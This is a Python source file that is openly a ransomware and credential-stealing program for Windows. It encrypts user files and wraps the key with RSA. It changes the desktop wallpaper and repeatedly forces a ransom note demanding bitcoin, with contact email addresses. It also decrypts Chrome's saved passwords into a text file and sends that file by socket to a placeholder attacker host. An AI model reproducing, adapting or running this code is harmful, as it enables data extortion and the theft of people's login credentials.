from cryptography.fernet import Fernet
import os
import json
import win32crypt
import shutil
import webbrowser
import tqdm
import ctypes
import urllib.request
import sqlite3
import requests
import time
import datetime
import subprocess
import win32gui
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading
import socket

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096
host = "attackers ip address"
port = 5001



class RansomWare:

   
    file_exts = [
        'txt',
       
        #'PNG',

    ]


    def __init__(self):
        self.key = None
        self.crypter = None
        self.public_key = None

        ''' Root directorys to start Encryption/Decryption from
            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
           
        '''
        self.sysRoot = os.path.expanduser('~')
        self.localRoot = os.path.expanduser('~') + r'\Desktop\testfolder' #Testing
        self.publicIP = requests.get('https://api.ipify.org').text


    def generate_key(self):
        self.key =  Fernet.generate_key()
        self.crypter = Fernet(self.key)

   
    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)


   
    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            self.public_key = RSA.import_key(open('public.pem').read())  

            public_crypter =  PKCS1_OAEP.new(self.public_key)

            enc_fernent_key = public_crypter.encrypt(fernet_key)

            f.write(enc_fernent_key)
        with open(f'{self.sysRoot}/Desktop/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernent_key)
        self.key = enc_fernent_key
        self.crypter = None


    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                print(data)
                _data = self.crypter.encrypt(data)
                print('> File encrpyted')
                print(_data)
            else:
                _data = self.crypter.decrypt(data)
                print('> File decrpyted')
                print(_data)
        with open(file_path, 'wb') as fp:
            fp.write(_data)


    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)

   

    @staticmethod
    def what_is_bitcoin():
        url = 'https://www.google.com/search?client=opera-gx&q=what+is+bitcoin&sourceid=opera&ie=UTF-8&oe=UTF-8'
        webbrowser.open(url)


    def change_desktop_background(self):
        imageUrl = 'https://i.pinimg.com/originals/9c/63/9f/9c639fe3cf79e7ce30749d4200245a0d.jpg'
        path = f'{self.sysRoot}/Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
yess hmmm hakakekrer

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to fukishiseichik@gmail.com

2. You will recieve the bitcoin address for payment.
   Once payment has been completed, send another email to fuishiseichi@gmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will decrypt all your files
   IMPORTANT: To decrypt your files, place text file on desktop and wait shortly after it will begin to decrypt all files.

heheheh hakcinged hehehe gone files trolled
''')


    def show_ransom_note(self):
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0 #/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing')
                pass
            else:
                print('Ransom note is not the top window - kill/create process again')
                time.sleep(0.1)
                ransom.kill()
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])

            time.sleep(10)
            count +=1
            if count == 10:
                break

   
    def put_me_on_desktop(self):
       
        print('started')
        while True:
            try:
                print('trying')
               
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.crypt_system(encrypted=True)
                    
                    print('decrypted')
                    break
            except Exception as e:
                print(e)
                pass
            time.sleep(10)
            print('Checking for PUT_ME_ON_DESKTOP.txt')
           

       
def socketft():
    s = socket.socket()
    print(f"[+] Connecting to {host}:{port}")
    s.connect((host, port))
    print("[+] Connected.")
    filename = r"C:\Users\Lenovo\Desktop\passtxt.txt"
    filesize = os.path.getsize(filename)
    s.send(f"{filename}{SEPARATOR}{filesize}".encode())
   
    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break
       
            s.sendall(bytes_read)
            progress.update(len(bytes_read))

    s.close()

def get_chrome():
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]  # removing DPAPI
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
            return decrypted_pass
        except Exception as e:
         # print("Probably saved password from Chrome version older than v80\n")
         # print(str(e))
            return "Chrome < 80"
 

    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if len(username) > 0:
                string = ("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                print(string)
                passtxt = open(r'C:\Users\Lenovo\Desktop\passtxt.txt','a')
                passtxt.write(string)
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass
       

def main():

    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcoin()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted')
    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine')
    t2.start()
    print('> RansomWare: Target machine has been un-encrypted')
    print('> RansomWare: Completed')



if __name__ == '__main__':
    get_chrome()
    socketft()
    main()
